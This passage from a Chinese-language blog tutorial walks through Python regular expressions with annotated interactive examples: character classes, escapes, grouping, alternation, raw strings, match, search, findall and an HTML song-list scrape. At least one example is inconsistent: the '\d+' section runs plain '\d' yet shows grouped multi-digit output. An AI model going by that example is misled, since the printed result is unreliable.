class="string">"匹配a规则这个字符串是否匹配b规则则则则则"</span>)   <span class="comment">#需要字符串里完全符合，匹配规则，就匹配，（规则里的 [] 元字符）对应位置是[]里的任意一个字符就匹配</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹配a规则'</span>, <span class="string">'匹配b规则'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配[a,b,c]规则\t"</span>, <span class="string">"匹配a规则这个字符串是否匹配b规则则则则则"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[<span class="string">'匹配a规则\t'</span>]</span><br></pre></td></tr></table></figure><h4 id="反斜杠后边跟普通字符实现特殊功能；（即预定义字符）"><a href="#反斜杠后边跟普通字符实现特殊功能；（即预定义字符）" class="headerlink" title="反斜杠后边跟普通字符实现特殊功能；（即预定义字符）"></a>反斜杠后边跟普通字符实现特殊功能；（即预定义字符）</h4><p>预定义字符是在字符集和组里都是有用的</p><p>\d匹配任何十进制数，它相当于类[0-9]</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\d"</span>, <span class="string">"匹配规则这2个字符串33是否匹配规则5则则则7则"</span>)   <span class="comment">#\d匹配任何十进制数，它相当于类[0-9]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'3'</span>, <span class="string">'5'</span>, <span class="string">'7'</span>]</span><br></pre></td></tr></table></figure><p>\d+如果需要匹配一位或者多位数的数字时用</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\d"</span>, <span class="string">"匹配规则这2个字符串33是否匹配规则5则则则7则"</span>)   <span class="comment">#\d匹配任何十进制数，它相当于类[0-9]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'2'</span>, <span class="string">'33'</span>,  <span class="string">'5'</span>, <span class="string">'7'</span>]</span><br></pre></td></tr></table></figure><p>\D匹配任何非数字字符，它相当于类[^0-9]</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\D"</span>, <span class="string">"匹配规则这2个字符串33是否匹配规则5则则则7则"</span>)   <span class="comment">#\D匹配任何非十进制数，它相当于类[^0-9]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹'</span>, <span class="string">'配'</span>, <span class="string">'规'</span>, <span class="string">'则'</span>, <span class="string">'这'</span>, <span class="string">'个'</span>, <span class="string">'字'</span>, <span class="string">'符'</span>, <span class="string">'串'</span>, <span class="string">'是'</span>, <span class="string">'否'</span>, <span class="string">'匹'</span>, <span class="string">'配'</span>, <span class="string">'规'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>]</span><br></pre></td></tr></table></figure><p>\s匹配任何空白字符，它相当于类[\t\n\r\f\v]</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\s"</span>, <span class="string">"匹配规则   这2个字符串3是否匹\n配规则5则则则7则"</span>)   <span class="comment">#\s匹配任何空白字符，它相当于类[\t\n\r\f\v](横向制表符、换行、回车、换页、纵向制表符)</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'\t'</span>, <span class="string">' '</span>, <span class="string">' '</span>, <span class="string">'\n'</span>]</span><br></pre></td></tr></table></figure><p>\S匹配任何非空白字符，它相当于类[^\t\n\r\f\v]</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\S"</span>, <span class="string">"匹配规则   这2个字符串3是否匹\n配规则5则则则7则"</span>)   <span class="comment">#\S匹配任何非空白字符，它相当于类[^\t\n\r\f\v](横向制表符、换行、回车、换页、纵向制表符)</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹'</span>, <span class="string">'配'</span>, <span class="string">'规'</span>, <span class="string">'则'</span>, <span class="string">'这'</span>, <span class="string">'2'</span>, <span class="string">'个'</span>, <span class="string">'字'</span>, <span class="string">'符'</span>, <span class="string">'串'</span>, <span class="string">'3'</span>, <span class="string">'是'</span>, <span class="string">'否'</span>, <span class="string">'匹'</span>, <span class="string">'配'</span>, <span class="string">'规'</span>, <span class="string">'则'</span>, <span class="string">'5'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'7'</span>, <span class="string">'则'</span>]</span><br></pre></td></tr></table></figure><p>\w匹配包括下划线在内任何字母数字字符，它相当于类[a-zA-Z0-9_]</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">'\w'</span>,<span class="string">"https://www.cnblogs.com/"</span>)  <span class="comment">#\w匹配包括下划线在内任何字母数字字符，它相当于类[a-zA-Z0-9_]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'h'</span>, <span class="string">'t'</span>, <span class="string">'t'</span>, <span class="string">'p'</span>, <span class="string">'s'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'c'</span>, <span class="string">'n'</span>, <span class="string">'b'</span>, <span class="string">'l'</span>, <span class="string">'o'</span>, <span class="string">'g'</span>, <span class="string">'s'</span>, <span class="string">'c'</span>, <span class="string">'o'</span>, <span class="string">'m'</span>]</span><br></pre></td></tr></table></figure><p>\W匹配非任何字母数字字符包括下划线在内，它相当于类[^a-zA-Z0-9_]</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">'\W'</span>,<span class="string">"https://www.cnblogs.com/"</span>)  <span class="comment">#\W不匹配包括下划线在内任何字母数字字符，它相当于类[^a-zA-Z0-9_]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">':'</span>, <span class="string">'/'</span>, <span class="string">'/'</span>, <span class="string">'.'</span>, <span class="string">'.'</span>, <span class="string">'/'</span>]</span><br></pre></td></tr></table></figure><h4 id="元字符，分组"><a href="#元字符，分组" class="headerlink" title="()元字符，分组"></a>()元字符，分组</h4><p>也就是分组匹配，()里面的为一个组也可以理解成一个整体</p><p>如果()后面跟的是特殊元字符如   (adc)*   那么*控制的前导字符就是()里的整体内容，不再是前导一个字符</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="comment">#也就是分组匹配，()里面的为一个组也可以理解成一个整体</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.search(<span class="string">"(a4)+"</span>, <span class="string">"a4a4a4a4a4dg4g654gb"</span>)   <span class="comment">#匹配一个或多个a4</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result1 = result.group()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result1)</span><br><span class="line">a4a4a4a4a4</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.search(<span class="string">"a(\d+)"</span>,<span class="string">"a45646148a49a4a456048a45gg"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">&lt;re.Match object; span=(<span class="number">0</span>, <span class="number">9</span>), match=<span class="string">'a45646148'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result1 = result.group()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result1)</span><br><span class="line">a45646148</span><br></pre></td></tr></table></figure><h4 id="元字符，或"><a href="#元字符，或" class="headerlink" title="|元字符，或"></a>|元字符，或</h4><p>|或，或就是前后其中一个符合就匹配</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.findall(<span class="string">r"你|好"</span>, <span class="string">"a4a4a你4aabc4a4dgg好dg4g654g"</span>)   <span class="comment">#|或，或就是前后其中一个符合就匹配</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">[<span class="string">'你'</span>, <span class="string">'好'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.findall(<span class="string">r"a4a4a你|好dg4g654"</span>,<span class="string">"a4a4a你4aabc4a4dgg好dg4g654g"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">[<span class="string">'a4a4a你'</span>, <span class="string">'好dg4g654'</span>]</span><br></pre></td></tr></table></figure><h4 id="r原生字符"><a href="#r原生字符" class="headerlink" title="r原生字符"></a>r原生字符</h4><p>将在python里有特殊意义的字符如\b，转换成原生字符（就是去除它在python的特殊意义），不然会给正则表达式有冲突，为了避免这种冲突可以在规则前加原始字符r</p><p>(这里还有点问题，结果不太懂，为啥第一个不输出 [a\b] )</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.findall(<span class="string">r"a\b"</span>,<span class="string">"welcoma\b"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">[<span class="string">'a'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.findall(<span class="string">"a\b"</span>,<span class="string">"welcoma\b"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">[<span class="string">'a\x08'</span>]</span><br></pre></td></tr></table></figure><h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><p>result = re.method(“rule”,string)</p><h4 id="1-match-方法-从字符串头部开始匹配"><a href="#1-match-方法-从字符串头部开始匹配" class="headerlink" title="1. match()方法, 从字符串头部开始匹配"></a>1. match()方法, 从字符串头部开始匹配</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">print(len(content)) <span class="comment">#字符串长度</span></span><br><span class="line">result = re.match(<span class="string">r'^The\s\d+\s\w*'</span>, content) <span class="comment">#使用match匹配, 第一个参数为正则表达式, 第二个为要匹配的字符串</span></span><br><span class="line">print(result)</span><br><span class="line">print(result.group()) <span class="comment">#输出匹配内容</span></span><br><span class="line">print(result.span()) <span class="comment">#输出匹配内容的位置索引</span></span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">34</span></span><br><span class="line">&lt;_sre.SRE_Match object; span=(<span class="number">0</span>, <span class="number">13</span>), match='The <span class="number">123456</span> is'&gt;</span><br><span class="line">The <span class="number">123456</span> is</span><br><span class="line">(<span class="number">0</span>, <span class="number">13</span>)</span><br></pre></td></tr></table></figure><h4 id="2-匹配目标"><a href="#2-匹配目标" class="headerlink" title="2. 匹配目标"></a>2. 匹配目标</h4><p>在正则表达式中用()括起来可以使用group()输出, 若有n个(), 那么可以表示为group(n), 输出第n个括号匹配的内容.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">print(len(content)) <span class="comment">#字符串长度</span></span><br><span class="line">result = re.match(<span class="string">r'^The\s(\d+)\sis'</span>, content) <span class="comment">#使用match匹配, 第一个参数为正则表达式, 第二个为要匹配的字符串</span></span><br><span class="line">print(result)</span><br><span class="line">print(result.group()) <span class="comment">#输出匹配内容</span></span><br><span class="line">print(result.group(<span class="number">1</span>)) <span class="comment">#输出第一个被()包裹的内容</span></span><br><span class="line">print(result.span()) <span class="comment">#输出匹配内容的位置索引</span></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">34</span></span><br><span class="line">&lt;_sre.SRE_Match object; span=(<span class="number">0</span>, <span class="number">13</span>), match='The <span class="number">123456</span> is'&gt;</span><br><span class="line">The <span class="number">123456</span> is</span><br><span class="line"><span class="number">123456</span></span><br><span class="line">(<span class="number">0</span>, <span class="number">13</span>)</span><br></pre></td></tr></table></figure><h4 id="3-通用匹配"><a href="#3-通用匹配" class="headerlink" title="3.通用匹配"></a>3.通用匹配</h4><p>. 表示匹配任意字符, *表示匹配前面字符无限次.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">result = re.match(<span class="string">r'^The.*number.$'</span>, content) <span class="comment">#使用match匹配, 第一个参数为正则表达式, 第二个为要匹配的字符串</span></span><br><span class="line">print(result)</span><br><span class="line">print(result.group()) <span class="comment">#输出匹配内容</span></span><br><span class="line">print(result.span()) <span class="comment">#输出匹配内容的位置索引</span></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;_sre.SRE_Match object; span=(<span class="number">0</span>, <span class="number">34</span>), match='The <span class="number">123456</span> <span class="keyword">is</span> <span class="keyword">my</span> one phone <span class="built_in">number</span>.'&gt;</span><br><span class="line">The <span class="number">123456</span> <span class="keyword">is</span> <span class="keyword">my</span> one phone <span class="built_in">number</span>.</span><br><span class="line">(<span class="number">0</span>, <span class="number">34</span>)</span><br></pre></td></tr></table></figure><h4 id="4-贪婪与非贪婪"><a href="#4-贪婪与非贪婪" class="headerlink" title="4.贪婪与非贪婪"></a>4.贪婪与非贪婪</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">print(<span class="string">'贪婪匹配:'</span>)</span><br><span class="line">result = re.match(<span class="string">r'^The.*(\d+).*'</span>, content) <span class="comment">#使用match匹配, 第一个参数为正则表达式, 第二个为要匹配的字符串</span></span><br><span class="line">print(result.group()) <span class="comment">#输出匹配内容</span></span><br><span class="line">print(<span class="string">'result = %s'</span>%result.group(<span class="number">1</span>)) <span class="comment">#输出第一个被()包裹的内容</span></span><br><span class="line">print(<span class="string">'-'</span>*<span class="number">20</span>)</span><br><span class="line">print(<span class="string">'非贪婪匹配:'</span>)</span><br><span class="line">result = re.match(<span class="string">r'^The.*?(\d+).*'</span>, content) </span><br><span class="line">print(result.group())</span><br><span class="line">print(<span class="string">'result = %s'</span>%result.group(<span class="number">1</span>))</span><br><span class="line">print(<span class="string">'-'</span>*<span class="number">20</span>)</span><br><span class="line">result = re.match(<span class="string">r'^The.*?(\d+).*?'</span>, content)</span><br><span class="line">print(result.group())</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">贪婪匹配:</span><br><span class="line">The 123456 is my one phone number.</span><br><span class="line">result = 6</span><br><span class="line">--------------------</span><br><span class="line">非贪婪匹配:</span><br><span class="line">The 123456 is my one phone number.</span><br><span class="line">result = 123456</span><br><span class="line">--------------------</span><br><span class="line">The 123456</span><br></pre></td></tr></table></figure><h4 id="5-修饰符-re-S"><a href="#5-修饰符-re-S" class="headerlink" title="5.修饰符 re.S"></a>5.修饰符 re.S</h4><p>由于加上re.S参数后, 通配符 . 将可以匹配换行符, 所以result不为空, result2为空。除了re.S, 还有许多修饰符如, </p><p>re.I: 使用匹配时忽略大小写。（大写的i）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'''The 123456 is</span></span><br><span class="line"><span class="string">one of my phone.</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">result = re.match(<span class="string">'^The.*?(\d+).*?phone.'</span>, content, re.S)</span><br><span class="line"><span class="keyword">if</span> result:</span><br><span class="line">    print(result.group(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'result = None'</span>)</span><br><span class="line">result2 = re.match(<span class="string">'^The.*?(\d+).*?phone.'</span>, content)</span><br><span class="line"><span class="keyword">if</span> result2:</span><br><span class="line">    print(result2.group(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'result2 = None'</span>)</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123456</span><br><span class="line">result2 = None</span><br></pre></td></tr></table></figure><h4 id="6-转义匹配"><a href="#6-转义匹配" class="headerlink" title="6.转义匹配"></a>6.转义匹配</h4><p>由于()属于正则表达式的特殊字符, 因此在需要匹配()时, 需要加上转义字符’’.</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'(百度)www.baidu.com'</span></span><br><span class="line">result = re.<span class="keyword">match</span>(<span class="string">'(百度)www.baidu.com'</span>, content)</span><br><span class="line">result2 = re.<span class="keyword">match</span>(<span class="string">'\(百度\)www\.baidu\.com'</span>, content)</span><br><span class="line"><span class="keyword">if</span> result:</span><br><span class="line">    <span class="keyword">print</span>(result.<span class="keyword">group</span>())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">'result = None'</span>)</span><br><span class="line"><span class="keyword">if</span> result2:</span><br><span class="line">    <span class="keyword">print</span>(result2.<span class="keyword">group</span>())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">'result2 = None'</span>)</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = None</span><br><span class="line">(百度)www<span class="selector-class">.baidu</span><span class="selector-class">.com</span></span><br></pre></td></tr></table></figure><h4 id="7-search-方法-与match-方法不同-不需要从头部开始匹配"><a href="#7-search-方法-与match-方法不同-不需要从头部开始匹配" class="headerlink" title="7.search()方法, 与match()方法不同, 不需要从头部开始匹配"></a>7.search()方法, 与match()方法不同, 不需要从头部开始匹配</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"><span class="attribute">content</span> = <span class="string">'Other The 123456 is my one phone number.'</span></span><br><span class="line">result = re.search(<span class="string">'The.*?(\d+).*?number.'</span>, <span class="attribute">content</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result.group()</span></span>)</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The <span class="number">123456</span> <span class="keyword">is</span> <span class="keyword">my</span> one phone <span class="built_in">number</span>.</span><br></pre></td></tr></table></figure><h4 id="8-findall-方法"><a href="#8-findall-方法" class="headerlink" title="8.findall()方法"></a>8.findall()方法</h4><p>match()和search()都是返回匹配到的第一个内容就结束匹配, findall()是返回所有符合匹配规则的内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">html = '''</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"songs-list"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">"title"</span>&gt;</span>歌单<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"introduction"</span>&gt;</span>歌单列表<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"list"</span> <span class="attr">class</span>=<span class="string">"list-group"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"2"</span>&gt;</span>一路上有你<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"7"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/2.mp3"</span> <span class="attr">singer</span>=<span class="string">"任贤齐"</span>&gt;</span>沧海一声笑<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"4"</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/3.mp3"</span> <span class="attr">singer</span>=<span class="string">"齐秦"</span>&gt;</span>往事随风<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"6"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/4.mp3"</span> <span class="attr">singer</span>=<span class="string">"beyond"</span>&gt;</span>光辉岁月<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"5"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/5.mp3"</span> <span class="attr">singer</span>=<span class="string">"程慧玲"</span>&gt;</span>记事本<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-veiw</span>=<span class="string">"5"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/6.mp3"</span> <span class="attr">singer</span>=<span class="string">"邓丽君"</span>&gt;</span>但愿人长久<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">'''</span><br><span class="line"></span><br><span class="line">result = re.findall('<span class="tag">&lt;<span class="name">li.*?href="(.*?)".*?singer="(.*?)"</span>&gt;</span>(.*?)<span class="tag">&lt;/<span class="name">a</span>&gt;</span>', html, re.S)</span><br><span class="line">if result:</span><br><span class="line">    print(result)</span><br><span class="line">    for res in result:</span><br><span class="line">        print(res[0], res[1], res[2])</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[(<span class="string">'/2.mp3'</span>, <span class="string">'任贤齐'</span>, <span class="string">'沧海一声笑'</span>), 